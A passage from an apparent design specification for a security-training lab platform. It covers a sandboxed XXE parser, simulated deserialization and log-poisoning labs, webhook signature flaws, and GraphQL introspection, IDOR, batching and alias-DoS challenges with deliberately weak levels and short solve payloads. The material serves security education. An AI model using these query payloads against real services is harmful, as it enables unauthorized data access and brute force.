  - The XML declaration, comments, PIs, CDATA, character references, and namespaces.
  - DOCTYPE with an internal subset.
  - An external subset (`SYSTEM`/`PUBLIC` on the DOCTYPE).
  - `<!ENTITY>`: general and parameter, internal and external (`SYSTEM "uri"` or `PUBLIC "pubid" "uri"`).
  - `<!ELEMENT>`, `<!ATTLIST>` and `<!NOTATION>`: skipped syntactically. ATTLIST defaults are **not** applied, since no
    lab needs them.
  - Conditional sections (`<![INCLUDE[`, `<![IGNORE[`) in the external subset only.
- **XML 1.0 rules modelled precisely** (they are the lesson):
  - A parameter-entity reference inside a markup declaration of the **internal** subset is a well-formedness error,
    `PEReferences forbidden in internal subset`. Between declarations, it is allowed.
  - In the **external** subset (a loaded DTD), PE references are allowed anywhere, including inside entity values.
  - Entity value literals expand character references and PE references (external subset only) **at declaration**, and
    bypass general entity references until use.
  - General entity references in content expand recursively. In attribute values only internal entities are allowed:
    an external one is `External entity 'x' reference in attribute`.
  - A reference loop is `Detected an entity reference loop`.
  - An undeclared entity is `Entity 'x' not defined`.
  - This is why an out-of-band payload needs an **external** DTD on the player's server, the classic `evil.dtd`.
- **Options** (from the level file):

  ```ts
  export interface XmlParseOptions {
    readonly baseUri: string;                          // e.g. 'file:///srv/scriptorium/uploads/sigil.svg'
    readonly dtd: 'refuse' | 'internal' | 'load';      // refuse: any DOCTYPE throws "DOCTYPE is not allowed"; internal: the internal subset only; load: also the external subset (libxml2 DTDLOAD)
    readonly externalGeneral: boolean;                 // load SYSTEM/PUBLIC general entities (libxml2 NOENT)
    readonly externalParameter: boolean;               // load external parameter entities
    readonly xinclude: boolean;                        // process xi:include (namespace http://www.w3.org/2001/XInclude)
    readonly resolve: XmlResolver;                     // the lab's sandboxed loader
  }
  export type XmlResolver = (uri: string, kind: 'dtd' | 'general' | 'parameter' | 'xinclude')
    => { readonly ok: true; readonly text: string } | { readonly ok: false; readonly error: string };
  ```

  - When an external general entity is **not** loaded, its reference expands to `''`, as libxml2 does without NOENT.
  - Relative system identifiers resolve against `baseUri` with `new URL(id, baseUri)`. That is how
    `SYSTEM "/srv/…"` and `"../x"` reach `file:` (SC-15 Templar).
- **`xmlResolver({ fs, net })`** is the sandboxed loader every lab uses:
  - `file:` → `fs.read(decodeURIComponent(pathname))`, as UTF-8. A missing file is `failed to load external entity
    "<uri>"`, the libxml2 message whose echo of the URI makes **error-based** exfiltration work.
  - `http:`/`https:` → `net.fetch(uri)` (GET). A non-2xx answer or a fetch error is that same message. The URL, the
    stolen data included, lands in the player's attacker log as a server hit.
  - Anything else (`php:`, `expect:`, `jar:`, `netdoc:`, `gopher:`, `ftp:`, `data:`) is `unsupported scheme "<s>:"`.
- **XInclude:**
  - `href` (resolved against the document's base) with `parse="xml"` (the default: the included document is parsed
    with the same options and its root inserted) or `parse="text"` (inserted as text).
  - An `xi:fallback` child is used on failure. `xpointer` is `XInclude: XPointer is not supported`.
  - Nesting ≤ 3; recursion is `XInclude: recursion detected`.
- **Bounds** (`XML_LIMITS`; platform safety, never the lesson, and no level can raise them):
  - Input ≤ 64 KiB. Elements ≤ 4096. Depth ≤ 64. Attributes ≤ 64 per element.
  - Declared entities ≤ 64. Entity references expanded ≤ 4096. Entity nesting ≤ 8.
  - Characters produced by expansion ≤ 64 KiB in total, **and** expansion output ≤ 10 × the input length + 4 KiB.
    Billion laughs and quadratic blowup fail fast with `Maximum entity amplification factor exceeded`.
  - External loads ≤ 4 per parse, each ≤ 16 KiB.
  - Target: the worst case under the caps in under 10 ms, measured in the guard spec ("billion laughs", "one 64 KiB
    entity × 4096 refs", "4096 nested elements").
- **Output** `XmlDoc`: `{ root: XmlElement }`, where `XmlElement = { name, prefix, local, ns, attrs: { name, ns, value
  }[], children: (XmlElement | string)[] }`. Helpers `textOf(el)` and `elementsByName(doc, ns, local)`. Every string is
  a copy.
- **Never routed to the XSS oracle.** No level serves the player's XML to a browser; uploads come back only as inert
  downloads (RECIPES §9). The specs assert the views contain only escaped text.

### A5. Insecure deserialization (SC-20, node-serialize)

**Options.**

- **(i) A marker interpreter**, like `simInterpret`. The host parses the JSON and classifies each
  `_$$ND_FUNC$$_…` string by regex (IIFE or not), and "runs" a function by scanning it for a marker statement.
  - No dependency on E4.
  - JavaScript semantics are guessed by regex: `}()`, `}.call()`, `(function(){})()` and `toString` gadgets are judged
    by patterns that real payloads defeat both ways.
  - Payloads become `hvwa()` markers rather than the `require('child_process')` the lesson is about.
- **(ii) E4's QuickJS sandbox with its fake Node host.** A node-serialize-compatible `unserialize`, our own code
  written from scratch (MIT), runs **inside** QuickJS. It does exactly what the library does: for each string starting
  with `_$$ND_FUNC$$_`, `eval('(' + rest + ')')`, with `require` in scope as the library's module scope has it. The
  app's render step (string coercion of fields) also runs inside the sandbox. `require('child_process').execSync`
  is E4's **fake** shell over planted files, and nothing reaches the host. The same real payloads and gadgets as in the
  wild work, and the same filters fail the same way.

**Recommendation: (ii)**, as an E4 extension (engine task E9), with (i) only as the fallback if E4 is not merged.
QuickJS already runs arbitrary player JS for FP-07 (template → `Function`), so this adds no new capability, only a
second entry point. No host `eval`, `vm` or `Function` is involved, ever, and E4's guard spec is extended to the new
module.

```ts
// core/ssti/serialized.ts (E9)
export interface SerializedResult { readonly ok: boolean; readonly fields?: readonly string[]; readonly error?: string;
  readonly limit?: SstiLimit; readonly shellCalls: readonly string[] }
/** Inside a fresh QuickJS instance (E4 worker, same deadline/memory/stack caps): obj = unserialize(text) with
 *  node-serialize semantics (recursing into nested objects and arrays); then String(obj[f]) for each f in `render`
 *  (each in its own try/catch, so a throwing toString yields its error text). `node` plants files for the fake shell. */
export function unserializeInSandbox(input: { text: string; render: readonly string[]; node?: FakeNode;
  timeoutMs?: number }): Promise<SerializedResult>;
```

- `text` must be ≤ 4 KiB. `render` holds at most 4 field names `[a-z]{1,16}`.
- The sandbox has no loaders and no network. The fake shell is E4's command set (`cat`, `id`, `ls` …).
- Results are clipped like SSTI results. Errors are shown escaped, with the message below Divine and a generic one at
  Divine (E4's `shown(req, r)`).

### A6. LFI → log poisoning (SC-13)

**Simulated access log.** SC-13's `model.ts` writes Apache combined-format lines into the player's `simFs`:
`127.0.0.1 - - [17/Nov/2026:10:00:00 +0000] "GET <path?query> HTTP/1.1" 200 - "<referer>" "<user-agent>"`.

- The log is `/var/log/scriptorium/access.log`, kept to the newest 20 lines (rotation).
- Each line is written **after** the response is built. A poisoned line therefore shows up for the **next** request, as
  with Apache's logging after the response.
- Every field is clipped (path 300, referer 200, UA 200). How fields are escaped is **the level's** `logField(s)` (raw at
  A and I, escaped at D).
- The app's error log is `/srv/app/storage/logs/app.log` (Laravel-style), also kept to 20 lines.
- Both log files are pinned.

**Simulated include.** `simInclude(bytes, canary)` lands next to `simInterpret` in `core/simfs.ts` (shared-template
task S3):

- It returns `{ output: string; ran: boolean }`: the file's text (Latin-1 decoded), where each occurrence of
  `SIM_SCRIPT_STATEMENT` (`<?hvwa CANARY ?>`, same tolerant regex) is **replaced** by the canary. A function canary is
  called only if one is present.
- Any other `<?hvwa …?>` block is left as text.
- Output is clipped to 16 KiB.
- Nothing executes. The upload guard spec covers it (it is in `core/simfs.ts`).
- Including a file prints it, as PHP's `include` prints non-code text. That is realistic, and the lab shows it escaped
  in a `<pre>`.

### A7. Webhooks, API key in the bundle, upstream consumption

- **AR-10 (outbound webhooks)** delivers through `simNet.fetch`: `POST`, a JSON body, `X-Archive-Event`, and
  `X-Archive-Signature: sha256=<hmac(hookSecret, body)>`. A "Recent deliveries" panel shows time, URL, address, status
  and the first 300 characters of the response (below Divine), like GitHub's delivery log.
- **AR-11 (inbound webhooks)** needs no engine. The signature schemes per level:

  | Level | Scheme | Flaw |
  |---|---|---|
  | A | none: the body is trusted | anyone can POST |
  | T | `Pilgrim-Signature: t=<unix>,v1=<hex>` with HMAC-SHA256 over `t.body`, compared as `expected.startsWith(v1)` ("tolerates the old SDK's truncated signatures") | an **empty** `v1=` matches |
  | I | the same HMAC, compared with `timingSafeEqual` on equal-length buffers | no timestamp tolerance, no event-id memory: a **replayed** old event is accepted |
  | D | as I, plus `abs(now − t) ≤ 300 s` on the injectable clock, plus processed event ids (≤ 50, bounded), plus "newer than the account's last event" | — |

- **AR-12 (bundle)**: the lab serves `<lab>/assets/app.js` with `application/javascript; charset=utf-8` and
  `X-Content-Type-Options: nosniff`. At Templar it also serves `<lab>/assets/app.js.map`. Both are lab-authored text,
  built per level from per-session values, with **no player bytes**.
- **AR-13 (upstream)**: the upstream "Open Codex" is a lab service on `simNet` (`api.opencodex.test`, 192.0.2.40:80) whose
  records the player edits through the lab page ("your author account on Open Codex").

### A8. Dependencies, compose services, platform headers (decisions summarised; questions in D)

| Item | Recommendation |
|---|---|
| `graphql@16.14.2` (runtime) | **Add** (Q1). Fallback: hand-rolled, with graphql-js as a devDependency oracle (Q1b). |
| `ws` | **Do not add** (Q2); hand-rolled `core/ws`. Tests use Node's global `WebSocket`. |
| New compose services (metadata, DNS, internal admin, attacker) | **None** (Q4): `simNet` in-process. |
| nginx | **No change.** WebSocket upgrade forwarding is already configured; the 60 s `proxy_read_timeout` is above the 30 s ping. |
| `docker-compose.yml`, Dockerfile | **No change.** |
| Global security headers / CSP | **No change.** AR-12's JS is served from a lab route, lab-authored; socket labs need no header. |
| Platform behaviour changes | (a) The upgrade listener with Host guard + Origin guard + no session minting (Q3). (b) Reserved `/sim/` lab prefix; `victim.actions` may be empty with `net` (Q8). (c) `POST <lab>/ws/frames` mounted for socket labs (Q11). |

---

## 1. Engine tasks (ordered; each with its own spec-review gate)

As in D0 and E0–E4: write the engine task and its guard spec first, review it, then build the labs that depend on it.

- **S3 — Phase 3 shared template.** No engine logic. It is engine-adjacent plumbing for both districts.
  - The `archive-api` district: `src/districts/archive-api/index.ts`, registered in `src/districts/index.ts`.
  - `archive-api/_shared/api-lab.ts`:
    - `apiKeyFor(req)`: per-(session, level) `ak_pilgrim_<32 hex>`, in `perSession`.
    - `viewerOf(req)`: `Authorization: Bearer <key>` → `'pilgrim' | null`; the curator's key is a model seam, never
      shown.
    - `sendJson(res, status, body)` and `jsonError(res, status, message)`.
    - `flagJson(req, challenge)`: `{ flag }` below Divine, `{}` at Divine.
    - `mountIntents`-style intent routing for the landing pages (`api-lab` keeps its own copy of the RM pattern,
      because one district never imports another's `_shared`; move it to `districts/_shared/` if the controller
      prefers, Q15).
    - `views/endpoints.ejs`, `views/console.ejs` (a JSON request console: method, path, headers and body textarea,
      used only by labs that need it) and `views/key.ejs` ("Your API key").
    - `api-lab.testkit.ts`: `describeApiLanding({ challenge, path, endpoints })`.
  - `simInclude` in `core/simfs.ts` (A6), with its tests in `tests/simfs.spec.ts`.
  - RECIPES section stubs (§15 network, §16 XXE, §17 GraphQL, §18 sockets, §19 deserialization). Final numbers are
    coordinated with E4's §14.

  **Blocks:** every Phase 3 lab.
- **E5 — `core/sim` network** (A3): `ip.ts`, `dns.ts`, `net.ts`, `imds.ts`; `simWorld({ inbox: false })`; the
  attacker-log extension; `VictimConfig.net` with the engine routes and panel sections; RECIPES §15.
  - Guard spec:
    - the import guard extended to the new files;
    - spies during `fetch`;
    - IP ground-truth matrix (every row of A3's table, mapped, compatible, NAT64, `0`, `::`);
    - `isPublicAddress` matrix;
    - DNS: zones, player records, TTL cache on a moved clock, the rebinding sequence and its reset on save, logging of
      zone queries only on a cache miss;
    - fetch: schemes, header validation, method rewriting on 301/302/303 vs 307/308, redirect cap, pin on hop 1 only,
      ECONNREFUSED vs ETIMEDOUT, the 8-request action cap;
    - IMDS v1/v2/TTL/XFF/expiry;
    - player server routes, and that the attacker log records server and DNS hits;
    - every stored string a copy;
    - weight measurement (`tests/lab-state-weights.spec.ts` style).

  **Blocks:** SC-16, SC-17, SC-18, SC-19, AR-10, AR-13; and SC-14/15 (through E6's resolver).
- **E6 — `core/xmldtd`** (A4) and `xmlResolver({ fs, net })`; RECIPES §16. It can be built and gated with a fake
  resolver before E5 merges; the `xmlResolver` integration test lands after E5.
  - Guard spec:
    - an XML conformance corpus (well-formed and malformed documents with expected messages);
    - entities: internal, external general/parameter, the internal-subset PE rule, the external-DTD out-of-band
      pattern, the error-based pattern (message carries the file text), relative system ids against `baseUri`;
    - XInclude `xml`/`text`/fallback/recursion/xpointer;
    - bounds with timings (billion laughs, quadratic blowup, deep nesting, too many loads);
    - option matrix (`refuse`/`internal`/`load` × external flags);
    - import guard.

  **Blocks:** SC-14, SC-15.
- **E7 — `core/graphql`** (A1), with Q1 decided; RECIPES §17.
  - Guard spec:
    - prescan bounds;
    - `LinearFieldMergeRule` (rejects differing names and arguments, message equal to graphql-js; the "stays linear"
      timing);
    - transport (single, array, GET, batching policy, status codes, content types);
    - `textFilter` runs before parse;
    - introspection on/off;
    - suggestion stripping;
    - Divine error masking;
    - resolver-call budget with truncation;
    - `virtualCost` (aliases, fragments memoised, list multipliers, the cap);
    - the conformance corpus against graphql-js.

  **Blocks:** AR-01 … AR-06.
- **E8 — `core/ws` + sim socket** (A2). **Depends on E1 being merged** (the SameSite jar and the attacker-page
  presets). RECIPES §18. Contents:
  - `frames.ts`, `app.ts`, `server.ts`, `fallback.ts`;
  - `host-guard.ts` `hostAllowed` refactor;
  - `defineChallenge({ socket })` + `mountChallenges` table + `/ws/frames`;
  - the `app.locals.upgrade` / `lifecycle.listen` / `serve()` wiring;
  - `core/sim/socket.ts`, `crossSiteSocket`, `AttackerStep` kind `socket`.

  Guard spec:
  - **framing:** masks, RSV, opcodes, control frame sizes, fragmentation, caps before allocation, UTF-8 across
    fragments, close codes;
  - **handshake refusals:** Host 421, duplicate Host 400, Origin 403, no session 401, unknown path 404, version 426, bad
    key 400;
  - **caps:** 33rd socket 503, 5th per session 429;
  - rate close, idle/ping/lifetime on a fake clock;
  - **integration:** Node's global `WebSocket` against `serve(app)` (open, echo, close);
  - the fallback equals the real socket on a fixture lab (SW-01 in `tests/socket-lab.spec.ts`);
  - **sim:** SameSite None/Lax/Strict × cross-site socket, Origin page vs sandboxed `null`, no redirect, fragment
    `invalid`, received frames forwarded to the attacker log, frozen copies;
  - import guard (`core/sim/socket.ts` pure; `core/ws/server.ts` the only module touching sockets).

  **Blocks:** AR-14, AR-15.
- **E9 — sandboxed `unserialize`** (A5). **Depends on E4 being merged.** `core/ssti/serialized.ts` plus the engine
  program addition, and a RECIPES §14 addendum (or §19).
  - Guard spec:
    - node-serialize semantics: a prefixed IIFE runs at unserialize, a prefixed non-IIFE becomes a function, nested
      objects recurse, `$` escapes become `$` through `JSON.parse`;
    - the `render` coercion runs a restored `toString`;
    - the fake shell reads planted files only;
    - the deadline, memory and stack caps;
    - E4's host-side guard extended (no host eval or vm).

  **Blocks:** SC-20.

**Order:** S3 → (E5 ∥ E7) → E6 → E8 (once E1 is merged) → E9 (once E4 is merged).

- E5 and E7 are independent and may run in parallel worktrees.
- They touch different RECIPES sections. Expect only an index.ts import and `CATALOG.md` conflict, solved by
  regenerating the catalog.
- E6 can start once E5's types are stable.

---
## B. Per-lab designs

Legend per lab:

- slug · maps · state · Restart
- goal · page · levels (A/T/I/D flaws, exact behaviour) · Divine
- flag proof · victim + rearm · solve path per level
- matrix (send, resisted, resistedStatus, legit, malformed, privileged)
- `model.ts` seams · pitfalls
- text: title, summary, hints (ID+EN, no payloads; cost 10/20/40)

Each exploit is resisted at every implemented level above its own (case g). No `cumulative` entries are needed anywhere.

### B0. District rules — `archive-api` (AR-01 … AR-15)

- **API-only labs.** `GET /` serves an HTML landing page at every level (RECIPES §4): the endpoint table (method,
  path, auth, example), the player's identity and key, the curl note, and the lab's forms. The API lives on
  sub-paths.
  - Every form posts back to the lab root with no `action` and a hidden `intent` (Relic Market style), so
    `describeLabView` passes.
  - Each intent also has a named path for curl and scripts.
- **Identity.**
  - The REST labs (AR-07, 08, 09, 12) authenticate with `Authorization: Bearer <key>`. The key is per (session,
    level), `ak_pilgrim_<32 hex>` from `apiKeyFor`, and is shown on the page in `<code data-testid="api-key">`.
  - The curator's key is never shown. It is a model seam (`curatorKey(sid, level)`) for the privileged matrix case.
  - The GraphQL labs treat every caller as `pilgrim`, except where a lab says otherwise.
  - The socket labs sign in with the usual pilgrim/pilgrim form (`describeSignInView`).
- **JSON answers.**
  - Success is `200 { … }`; refusals are `{ "error": "<sentence>" }` with a real status (401/403/404/405/410/422).
  - A proof adds `"flag": "HVWA{…}"` below Divine (`flagJson`). It is computed outside `tryDb`, and never at Divine.
  - GraphQL answers put it in `extensions.flag`.
- **Proof predicates live in `model.ts`** (`proves(...)`), never in a level file.
- **Restart.** Labs whose state can wedge, and that have no limiter, pass `reset` (AR-08, 09, 10, 11, 13, 14, 15).
  AR-03 has a limiter, so it has no Restart. The others are read-only.
- **Body parsing.** The app-wide `express.json()` parses only `application/json`. Labs that need other media types
  mount `express.json({ type, limit })` or `express.raw(...)` **on their own route** (AR-08 JSON Patch / Merge Patch,
  AR-11 Pilgrim Pay events). The spec asserts the platform parser leaves those types alone.
- **Platform-safety bounds** (not the lesson) live in `model.ts` or `_shared`: maps ≤ the stated sizes, stored strings
  clipped with the copying `clip`, attacker-keyed maps bounded with `putBounded`.

---

### AR-01 — GraphQL introspection leak · `graphql-introspection` (levels A/T/D)

Maps `API9:2023`, `CWE-200`. State: `perLevel` (schema and seal). No Restart.

- **Goal.** Find the hidden field of the Archive's GraphQL API and open the archivist's vault.
- **Page.** Query console, curl lines, a short "public schema" paragraph that lists `scrolls` and `scroll` only, and a
  note that GraphQL clients may be pointed at `<lab>/graphql`.
- **Schema** (built per level in `model.ts`; resolvers in `model.ts` call the level's policy):

  ```graphql
  type Query {
    scrolls(first: Int = 10): [Scroll!]!
    scroll(id: Int!): Scroll
    "Internal archivist tooling. Seal for this deployment: <seal>"    # A/T only (D: no seal in the text)
    archivistVault(seal: String!): String
  }
  type Scroll { id: Int!  title: String!  shelf: String! }
  ```

  `<seal>` is 8 random hex characters per level (`perLevel`).
- **Level interface:** `policy: GraphqlPolicy`, `canOpenVault(viewer): boolean`, `describeSeal: boolean`.
- **Levels.**
  - **A**: introspection on, suggestions on, any caller may open the vault with the right seal ("nobody knows the field
    exists").
  - **T**: `textFilter` refuses any query whose text contains `__schema` (case-sensitive substring), with 400
    `Introspection is disabled.` The `__type(name:)` entry point and suggestions remain.
  - **D**: `introspection: false` (graphql-js `NoSchemaIntrospectionCustomRule`, which covers `__schema` **and**
    `__type`) and `suggestions: false`. The description carries no secret. `archivistVault` requires the curator role
    (`Not authorized.`) **before** looking at the seal. ASVS 5.0 V4 (GraphQL: introspection and suggestions off in
    production), V8 (authorization, not obscurity).
- **Flag proof.** `archivistVault` with the right seal by a pilgrim: the resolver returns `Vault opened. Flag: …`
  below Divine.
- **Victim.** None.
- **Solve.**
  - A: `{ __schema { queryType { fields { name description args { name } } } } }` → read the seal →
    `{ archivistVault(seal: "<seal>") }`.
  - T: `{ __type(name: "Query") { fields { name description } } }` → the same.
- **Matrix.** `send` POSTs JSON to `/graphql`. The scripts parse the seal from the introspection answer, else send
  `none`.
  - `resisted`: `Not authorized.`.
  - legit: `{ scrolls { title } }` → `The Book of Hours`.
  - malformed `[]`.
  - privileged: Bearer `curatorKey(sid,'divine')` + the right seal → `Vault opened.`, no flag.
- **Seams.** `seal(level)`, `curatorKey`.
- **Pitfalls.**
  - The seal is per **level**, so the A seal is useless at T (GK-01's accepted perLevel-secret rule). The flag stays per
    session.
  - Suggestions match names, not descriptions, so they cannot leak the seal. The spec checks it.
  - D's denial must not reveal whether the seal was right.
- **Text.**
  - Title `{ id: 'Kebocoran Introspeksi GraphQL', en: 'GraphQL Introspection Leak' }`.
  - Summary `{ id: 'Temukan field tersembunyi di API GraphQL Arsip dan buka brankas arsiparis.', en: "Find the hidden field in the Archive's GraphQL API and open the archivist's vault." }`.
  - Hints:
    1. `{ id: 'API GraphQL bisa menjelaskan dirinya sendiri. Pertanyaan apa yang membuatnya mendaftar semua field-nya?', en: 'A GraphQL API can describe itself. Which question makes it list all of its fields?' }`
    2. `{ id: 'Deskripsi field kadang ditulis untuk sesama pengembang, bukan untuk publik. Bacalah dengan teliti.', en: 'Field descriptions are sometimes written for fellow developers, not the public. Read them closely.' }`
    3. `{ id: 'Di Templar satu kata kunci diblokir. Apakah introspeksi hanya punya satu pintu masuk?', en: 'At Templar one keyword is blocked. Does introspection have only one entry point?' }`

### AR-02 — GraphQL IDOR via resolver · `graphql-idor` (levels A/T/I/D)

Maps `API1:2023`, `CWE-639`. State: `perLevel` data (read-only); the flag is computed per request. No Restart.

- **Goal.** Read the body of Archivist Ilse's private scroll.
- **Schema.**

  ```graphql
  interface Node { id: ID! }
  type User implements Node { id: ID!  name: String!  scrolls: [Scroll!]! }
  type Scroll implements Node { id: ID!  title: String!  body: String  private: Boolean!  owner: User! }
  type Query { me: User!  user(id: ID!): User  scroll(id: ID!): Scroll  node(id: ID!): Node }
  ```

- **Data.**
  - Users: 1 Archivist Ilse (curator), 2 `pilgrim` (you), 3 Brother Tobias.
  - Scrolls:
    - 1 Ilse, private, "Vault inventory", body `Inventory seal: <flag>` below Divine, `Inventory seal: (sealed)` at
      Divine;
    - 2 Ilse, public;
    - 3 Tobias, public;
    - 4 pilgrim, private ("My notes");
    - 5 pilgrim, public.
  - The page lists the "Team directory" (users with ids) and "Your scrolls".
- **Level interface:**
  - `idOf(type, n)` and `parseId(id) → { type, n } | undefined` (A/T: plain `"1"`; I/D: global
    `base64("Scroll:1")`);
  - `canRead(viewer, scroll, via: 'scroll' | 'user.scrolls' | 'node') → boolean`.
- **Levels.**
  - **A**: `canRead` is always true; ids are sequential.
  - **T**: `via === 'scroll'` checks owner-or-public. `User.scrolls` and `node` return everything ("the entry point is
    guarded").
  - **I**: global opaque ids. `scroll` and `User.scrolls` both check. `node(id)` is the generic Relay resolver that
    loads any object by id **without** the type's authorization.
  - **D**: one `canRead` on every path (`scroll`, `User.scrolls`, `node`). An unreadable scroll is `null` with no error,
    and is filtered from lists. Ids are parsed strictly; an invalid one is `null`. ASVS 5.0 V8 (authorization in the
    data layer, not at the entry point).
- **Flag proof.** The flag-bearing body appears in the response (the body itself carries the flag below Divine).
- **Victim.** None.
- **Solve.**
  - A: `{ scroll(id: 1) { title body } }`.
  - T: `{ user(id: 1) { scrolls { title body } } }`.
  - I: `{ node(id: "U2Nyb2xsOjE=") { ... on Scroll { title body } } }` (the directory shows `VXNlcjox` for Ilse; the
    player encodes `Scroll:1`).
- **Matrix.**
  - `resisted` map: `{ acolyte: '"scroll":null', templar: '"user":null', inquisitor: '"node":null' }`. (At D,
    `user(id: 1)` is an invalid global id, so `null`.)
  - legit: `{ me { name scrolls { title } } }` → `My notes`.
  - malformed `[]`; privileged `null`.
- **Seams.** `globalId(type, n)`.
- **Pitfalls.**
  - `node` exists at every level. At A/T it is unguarded too, which is fine (lower levels may be weaker).
  - Denial at T/I is `null` + `Not authorized.` (an existence oracle, on purpose below Divine).
  - The body is computed in the resolver from `ctx.req`, so no flag is ever built at Divine.
  - Keep distinct from GK-12/FP-09/RM-11: the lesson is **graph edges and the node interface**.
- **Text.**
  - Title `{ id: 'IDOR GraphQL lewat Resolver', en: 'GraphQL IDOR via Resolver' }`.
  - Summary `{ id: 'Baca isi gulungan pribadi milik Arsiparis Ilse lewat API GraphQL.', en: "Read the body of Archivist Ilse's private scroll through the GraphQL API." }`.
  - Hints:
    1. `{ id: 'Id gulungan berurutan. Gulungan siapa yang punya id terkecil?', en: 'Scroll ids are sequential. Whose scroll has the smallest id?' }`
    2. `{ id: 'Dalam graf, satu objek bisa dicapai dari banyak arah. Apakah setiap jalur diperiksa sama ketatnya?', en: 'In a graph one object can be reached from many directions. Is every path checked as strictly?' }`
    3. `{ id: 'Di Inquisitor id-nya global dan buram. Adakah field yang mengambil objek apa pun hanya dari id-nya?', en: 'At Inquisitor ids are global and opaque. Is there a field that fetches any object from its id alone?' }`

### AR-03 — GraphQL batching brute force · `graphql-batching` (levels A/I/D)

Maps `API4:2023`, `CWE-307`. State: `perSession` (seal code, limiter). **No Restart** (limiter lab, RECIPES §4).

- **Goal.** Guess the archivist's three-digit seal code although the server limits attempts.
- **Schema.**

  ```graphql
  type Query { sealHint: String! }   # "Seal codes have three digits."
  type Mutation { redeemSeal(code: String!): SealResult! }
  type SealResult { ok: Boolean!  message: String!  reward: String }
  ```

- **State.** `{ code: '000'–'999' (random per instance), window: { start, used }, lock: { until, failures } }` on the
  injectable `state.now`.
- **Level interface:**
  - `batching: number` (operations allowed per JSON array; 0 refuses arrays);
  - `charge(meta: { operations: number; sealCalls: number }) → number` (attempts this HTTP request costs);
  - `limit: number` (attempts per 15-minute window);
  - `maxSealCallsPerDocument?: number`;
  - `onFailure?(state)` (D's escalating lock).
- **Levels.**
  - **A**: `batching: 200`; `charge` is 1 per HTTP request; limit 10 per 15-minute window. A request beyond the window
    is refused whole (`Too many attempts. Try again in N min.`).
  - **I**: `batching: 0` (arrays → 400 `Batching is disabled.`); `charge` is 1 per **operation**, the same limit. Aliases
    inside one operation are not counted.
  - **D**: arrays refused. A validation rule allows `redeemSeal` **once** per document (`redeemSeal may appear only once
    per request.`), counted through fragments. Each call is charged. 5 failures lock the account for 15 min, then double
    each time (cap 24 h, on `state.now`). ASVS 5.0 V6 (anti-automation per guess), V4 (GraphQL batching and alias
    limits).
- **Flag proof.** A `redeemSeal` with the right code returns `reward: "Seal accepted. Flag: …"` below Divine.
- **Victim.** None.
- **Solve.**
  - A: JSON arrays of up to 200 `mutation { redeemSeal(code: "NNN") { ok reward } }` (five arrays cover 000–999).
  - I: one mutation with ≤ 360 aliases `c123: redeemSeal(code: "123") { ok reward }` (three documents cover the space).
- **Matrix** (the GK rule: "N failed attempts, then the correct secret via the seam is still accepted"):
  - A: 9 single wrong requests, then one array of 150 wrong codes + the right one → flag.
  - I: 9 single wrong operations, then one operation with 150 wrong aliases + the right one → flag.
  - `resisted` map: `{ acolyte: 'Batching is disabled.', inquisitor: 'redeemSeal may appear only once per request.' }`;
    `resistedStatus` 400.
  - legit: `{ sealHint }` → `three digits`.
  - malformed `[]`; privileged `null`.
  - Plus: D locks after 5 failures and the right code is then refused; 14 minutes on the clock do not unlock it;
    `POST <lab>/_reset` is 404.
- **Seams.** `sealCode(sid, level)`, `labState(sid, level).now`.
- **Pitfalls.**
  - Count `sealCalls` by walking the expanded document (aliases and fragments). Otherwise a fragment trick beats D's
    once-per-document rule.
  - The array cap (200) is the platform's `GRAPHQL_LIMITS.batch`.
  - Distinct from GK-03 Inquisitor (a REST array of credential pairs) by its alias rung and by GraphQL operations.
  - Waiting must not beat the window (15 min below Divine; escalating at Divine).
- **Text.**
  - Title `{ id: 'Brute Force lewat Batching GraphQL', en: 'GraphQL Batching Brute Force' }`.
  - Summary `{ id: 'Tebak kode segel tiga digit meski server membatasi jumlah percobaan.', en: 'Guess the three-digit seal code although the server limits your attempts.' }`.
  - Hints:
    1. `{ id: 'Apa yang sebenarnya dihitung oleh pembatas: permintaan HTTP, operasi, atau tebakan?', en: 'What does the limiter actually count: HTTP requests, operations, or guesses?' }`
    2. `{ id: 'Badan permintaan GraphQL tidak harus berisi satu operasi saja.', en: 'A GraphQL request body need not hold just one operation.' }`
    3. `{ id: 'Di Inquisitor larik operasi ditolak. Bisakah satu operasi memanggil field yang sama berkali-kali dengan nama berbeda?', en: 'At Inquisitor arrays of operations are refused. Can one operation call the same field many times under different names?' }`

### AR-04 — GraphQL alias-based DoS · `graphql-alias-dos` (levels A/I/D)

Maps `API4:2023`, `CWE-770`. State: stateless. No Restart.

- **Goal.** Make one request force the server to render far more manuscripts than it should.
- **Schema.**

  ```graphql
  enum Format { PDF EPUB }
  type Rendition { scrollId: Int!  format: Format!  pages: Int!  url: String! }
  type Scroll { id: Int!  title: String! }
  type Query { scrolls(first: Int = 10): [Scroll!]!  render(scrollId: Int!, format: Format = PDF): Rendition! }
  ```

- **Cost model** (`virtualCost`): `render` costs 500 units ("a server-side PDF render"); every other field costs 1.
  `FLAG_COST = 20 000` (40 renders). The real resolver returns a stub (`pages: 12, url: '/renditions/<id>.pdf'`), and
  `extensions.cost = { units, note: 'Simulated: a real server would have rendered N PDFs' }`.
- **Level interface:** `rules: readonly ValidationRule[]`, `costBudget?: number`.
- **Levels.**
  - **A**: no limits.
  - **I**: an alias limiter written in the level file. It walks the **operation's own** selection sets (inline fragments
    included) with `walkFields(doc, …, { expandFragments: false })`, counts aliased fields, and refuses more than 10
    (`Too many aliases (at most 10).`). Named fragment spreads are not followed.
  - **D**: the same limit counted over the **expanded** document (fragments followed), then `costBudget: 5 000` on
    `virtualCost` (`Query cost N exceeds the limit of 5000.`). ASVS 5.0 V4 (GraphQL query cost analysis).
- **Flag proof.** A document that passed the level's validation and whose `virtualCost` is ≥ 20 000 adds
  `extensions.flag` below Divine.
- **Victim.** None.
- **Solve.**
  - A: `{ r1: render(scrollId: 1) r2: render(scrollId: 1) … r41: … }`.
  - I: five named fragments on `Query`, each with 9 aliased renders (distinct alias names r1…r45), all spread in the
    query (45 × 500 = 22 500).
- **Matrix.**
  - `resisted` `Too many aliases (at most 10).` (both exploits exceed 10 once fragments are expanded);
    `resistedStatus` 400.
  - legit: `{ render(scrollId: 1) { url pages } }` → `"pages":12`.
  - malformed `[]`; privileged `null`.
  - Plus: a 4000-token document answers in under 100 ms, with JSON under 64 KB.
- **Seams.** `FLAG_COST`, `RENDER_COST`.
- **Pitfalls.**
  - Identical response keys with identical arguments **merge** into one field (spec), so they are not amplification.
    Exploits use distinct aliases, and the spec pins that a repeated unaliased `render` costs 500 once.
  - Never really render: cost is arithmetic (RM-12 rule).
  - Distinct from AR-05: breadth through aliases and fragments, not depth.
- **Text.**
